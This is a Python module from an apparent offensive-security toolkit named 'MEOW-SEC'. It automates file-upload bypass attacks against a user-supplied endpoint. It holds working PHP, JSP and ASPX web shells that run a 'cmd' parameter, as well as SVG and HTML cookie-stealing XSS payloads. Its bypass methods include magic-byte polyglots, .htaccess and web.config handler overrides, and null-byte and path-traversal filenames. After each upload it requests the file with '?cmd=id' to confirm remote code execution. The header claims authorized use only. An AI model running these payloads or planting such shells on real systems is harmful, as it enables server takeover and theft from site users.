# -*- coding: utf-8 -*-
"""
MEOW-SEC :: UPLOAD — File Upload Bypass Tester
For authorized security testing and CTF challenges only.
"""
import os, io, json, time, random, string
from datetime import datetime
from urllib.parse import urlparse

from core.ui import (console, ok, err, info, warn, find, show_module_banner,
                     ask_target, ask_choice, print_result_table, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

_UA = "Mozilla/5.0 (authorized-pentest-upload)"

# ─── PAYLOADS ─────────────────────────────────────────────────

# PHP web shell content
_PHP_SHELL = b"<?php echo 'MEOW_RCE_' . shell_exec($_GET['cmd']); ?>"
_JSP_SHELL = b'<%@ page import="java.io.*" %><% String cmd=request.getParameter("cmd"); Process p=Runtime.getRuntime().exec(cmd); out.print(new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A").next()); %>'
_ASPX_SHELL = b'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>'
_HTML_XSS   = b'<html><body><script>document.write("MEOW_XSS_"+document.cookie)</script></body></html>'
_SVG_XSS    = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("MEOW_SVG_XSS")</script></svg>'

# Magic bytes for polyglots
_GIF_MAGIC  = b"GIF89a"
_PNG_MAGIC  = b"\x89PNG\r\n\x1a\n"
_JPG_MAGIC  = b"\xff\xd8\xff\xe0"
_PDF_MAGIC  = b"%PDF-1.4"
_ZIP_MAGIC  = b"PK\x03\x04"

# ─── BYPASS STRATEGIES ────────────────────────────────────────

def _build_payloads(shell: bytes = _PHP_SHELL) -> list:
    """Returns list of (filename, content, content_type, description)."""
    tag = "".join(random.choices(string.ascii_lowercase, k=6))
    payloads = []

    # 1. Double extension
    payloads.append((f"shell_{tag}.php.jpg",   shell,                    "image/jpeg",        "Double extension .php.jpg"))
    payloads.append((f"shell_{tag}.jpg.php",   shell,                    "application/x-php", "Double extension .jpg.php"))
    payloads.append((f"shell_{tag}.php5",      shell,                    "image/jpeg",        "PHP5 extension"))
    payloads.append((f"shell_{tag}.phtml",     shell,                    "image/jpeg",        ".phtml extension"))
    payloads.append((f"shell_{tag}.pHp",       shell,                    "image/jpeg",        "Mixed case .pHp"))
    payloads.append((f"shell_{tag}.php%00.jpg", shell,                   "image/jpeg",        "Null byte truncation"))

    # 2. Content-Type spoof
    payloads.append((f"shell_{tag}.php",       shell,                    "image/jpeg",        "PHP with image/jpeg MIME"))
    payloads.append((f"shell_{tag}.php",       shell,                    "image/png",         "PHP with image/png MIME"))
    payloads.append((f"shell_{tag}.php",       shell,                    "image/gif",         "PHP with image/gif MIME"))

    # 3. Magic bytes polyglot
    payloads.append((f"shell_{tag}.php",       _GIF_MAGIC + b"\n" + shell, "image/gif",      "GIF magic bytes + PHP shell"))
    payloads.append((f"shell_{tag}.php",       _JPG_MAGIC + b"\n" + shell, "image/jpeg",     "JPEG magic bytes + PHP shell"))

    # 4. SVG XSS
    payloads.append((f"xss_{tag}.svg",         _SVG_XSS,                 "image/svg+xml",     "SVG XSS"))
    payloads.append((f"xss_{tag}.svg",         _SVG_XSS,                 "image/jpeg",        "SVG XSS with JPEG MIME"))

    # 5. HTML/HTM
    payloads.append((f"xss_{tag}.html",        _HTML_XSS,                "text/html",         "HTML file XSS"))
    payloads.append((f"xss_{tag}.htm",         _HTML_XSS,                "text/html",         "HTM file XSS"))

    # 6. .htaccess upload (Apache)
    payloads.append((".htaccess",              b"AddType application/x-httpd-php .jpg", "text/plain", ".htaccess → execute .jpg as PHP"))

    # 7. web.config (IIS)
    payloads.append(("web.config",
        b'<?xml version="1.0"?><configuration><system.webServer><handlers><add name="php" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="C:\\php\\php-cgi.exe" /></handlers></system.webServer></configuration>',
        "text/plain", "web.config → execute .jpg as PHP (IIS)"))

    # 8. Path traversal in filename
    payloads.append((f"../shell_{tag}.php",    shell,                    "image/jpeg",        "Path traversal in filename"))
    payloads.append((f"....//shell_{tag}.php", shell,                    "image/jpeg",        "Double-dot traversal"))

    # 9. JSP / ASPX
    payloads.append((f"shell_{tag}.jsp",       _JSP_SHELL,               "image/jpeg",        "JSP shell"))
    payloads.append((f"shell_{tag}.aspx",      _ASPX_SHELL,              "image/jpeg",        "ASPX shell"))

    return payloads

# ─── RCE VERIFICATION ─────────────────────────────────────────

_RCE_MARKER = "MEOW_RCE_"
_XSS_MARKER = "MEOW_XSS_"
_SVG_MARKER = "MEOW_SVG_XSS"

def _check_exec(base_url: str, filename: str, upload_response) -> str:
    """Try to access the uploaded file and detect execution."""
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    candidate_paths = [
        f"/uploads/{filename}",
        f"/upload/{filename}",
        f"/files/{filename}",
        f"/media/{filename}",
        f"/images/{filename}",
        f"/static/{filename}",
        f"/assets/{filename}",
        f"/{filename}",
    ]

    # Also check if response body contains a path
    if upload_response and upload_response.text:
        try:
            data = upload_response.json()
            for key in ("url", "path", "file", "filename", "location", "src"):
                if key in data and isinstance(data[key], str):
                    candidate_paths.insert(0, data[key])
        except Exception:
            import re
            matches = re.findall(r'["\']([/\w\-\.]+\.' + filename.split(".")[-1] + r')["\']', upload_response.text)
            for m in matches:
                candidate_paths.insert(0, m)

    for path in candidate_paths:
        url = path if path.startswith("http") else origin + path
        try:
            r = requests.get(url + "?cmd=id", timeout=8, verify=False, proxies=_px(),
                             headers={"User-Agent": _UA})
            if r and _RCE_MARKER in r.text:
                return f"RCE confirmed at {url}?cmd=id"
            if r and r.status_code == 200:
                if _XSS_MARKER in r.text or _SVG_MARKER in r.text:
                    return f"XSS confirmed at {url}"
                if r.text.strip().startswith("<?php") or "shell_exec" in r.text:
                    return f"File served raw (not executed) at {url}"
                if len(r.content) > 0:
                    return f"File accessible at {url} (HTTP 200, {len(r.content)} bytes)"
        except Exception:
            continue
    return ""

# ─── UPLOAD ATTEMPT ──────────────────────────────────────────

def _upload(url: str, field: str, filename: str, content: bytes,
            content_type: str, extra_fields: dict, cookies: dict):
    files = {field: (filename, io.BytesIO(content), content_type)}
    data = extra_fields.copy()
    try:
        r = requests.post(url, files=files, data=data, cookies=cookies,
                          headers={"User-Agent": _UA},
                          timeout=15, verify=False, proxies=_px())
        return r
    except Exception as e:
        return None

# ─── SAVE ─────────────────────────────────────────────────────

def _save(target: str, findings: list):
    if not findings:
        return
    os.makedirs("data", exist_ok=True)
    fname = f"data/upload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "findings": findings, "ts": datetime.now().isoformat()}, f, indent=2)
    ok(f"Saved → {fname}")

# ─── MAIN ─────────────────────────────────────────────────────

def run():
    show_module_banner("upload")
    if not HAS_REQUESTS:
        err("requests not installed"); return

    console.print(f"\n  [{CY}]File Upload Bypass Tester[/]  [{DM}]— extension bypass, polyglot, .htaccess, path traversal[/]\n")

    url = ask_target("Upload endpoint URL (e.g. https://site.com/upload)")
    if not url:
        return
    if not url.startswith("http"):
        url = "http://" + url

    field = ask_choice("File input field name [default: file]") or "file"

    extra_raw = ask_choice("Extra POST fields (key=value&key2=val2) [Enter to skip]")
    extra_fields = {}
    if extra_raw:
        for part in extra_raw.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                extra_fields[k.strip()] = v.strip()

    cookie_str = ask_choice("Session cookie (name=value; ...) [Enter to skip]")
    cookies = {}
    if cookie_str and "=" in cookie_str:
        for part in cookie_str.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k.strip()] = v.strip()

    console.print(f"\n  [{CY}]Shell language:[/]")
    console.print(f"  [{G2}][1][/] PHP   [{G2}][2][/] JSP   [{G2}][3][/] ASPX   [{G2}][4][/] Auto (PHP default)")
    lang = ask_choice("Lang") or "1"
    shell = _PHP_SHELL
    if lang == "2":
        shell = _JSP_SHELL
    elif lang == "3":
        shell = _ASPX_SHELL

    payloads = _build_payloads(shell)
    findings = []

    console.print(f"\n  [{G1}]Testing {len(payloads)} bypass techniques...[/]\n")

    for filename, content, ctype, desc in payloads:
        r = _upload(url, field, filename, content, ctype, extra_fields, cookies)
        if r is None:
            console.print(f"  [{DM}]  {desc:<50}  →  ERR[/]")
            continue

        exec_result = _check_exec(url, filename, r)

        if r.status_code in (200, 201, 302) and ("success" in r.text.lower() or
                "upload" in r.text.lower() or exec_result or r.status_code == 200):
            severity = "CRITICAL" if exec_result else "MEDIUM"
            color = RD if severity == "CRITICAL" else OR
            find(f"[{color}][{severity}][/{color}] {desc}")
            if exec_result:
                ok(f"  Execution: {exec_result}")
            console.print(f"  [{DM}]  filename={filename}  mime={ctype}  HTTP {r.status_code}[/]")
            findings.append({
                "desc": desc,
                "filename": filename,
                "content_type": ctype,
                "status": r.status_code,
                "exec": exec_result,
                "severity": severity,
            })
        else:
            console.print(f"  [{DM}]  {desc:<50}  →  {r.status_code if r else 'ERR'} (blocked)[/]")

    console.print()
    if findings:
        cat_talk(CAT_FOUND, f"{len(findings)} upload bypass(es) found!")
        rows = [[f["severity"], f["filename"], f["content_type"], str(f["status"]), f["exec"] or "—"]
                for f in findings]
        print_result_table(["Severity", "Filename", "MIME", "Status", "Exec"], rows)
        _save(url, findings)
    else:
        cat_talk(CAT_SCAN, "All upload vectors were blocked.")
